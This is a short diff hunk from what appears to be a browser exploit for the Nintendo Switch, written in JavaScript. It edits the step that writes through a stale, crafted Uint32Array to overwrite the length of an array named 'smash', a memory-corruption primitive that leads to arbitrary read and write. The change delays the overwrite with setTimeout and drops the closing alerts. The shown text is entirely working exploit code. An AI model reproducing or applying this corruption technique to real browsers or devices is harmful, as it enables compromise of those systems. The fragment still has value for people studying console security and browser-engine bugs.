@@ -183,13 +183,11 @@
                                     // write to the 6th 32bit value of the memory pointed to by the crafted Uint32Array
                                     // which should point to the struct of smash, allowing us to overwrite the length of smash
                                     alert('smash.length is: 0x'+smash.length.toString(16));
-                                    stale[0][6] = 0x1339;
+                                    setTimeout(function() {
+                                        stale[0][6] = 0x1339;
+                                        alert('smash.length is now: 0x'+smash.length.toString(16));
 
-                                    // check the length of smash is now.
-                                    alert('smash.length is now: 0x'+smash.length.toString(16));
-
-                                    alert('done!\nswitch will probably crash now :O');
-                                    return;
+                                    }, 1500);
                                 }
                             }
                         }
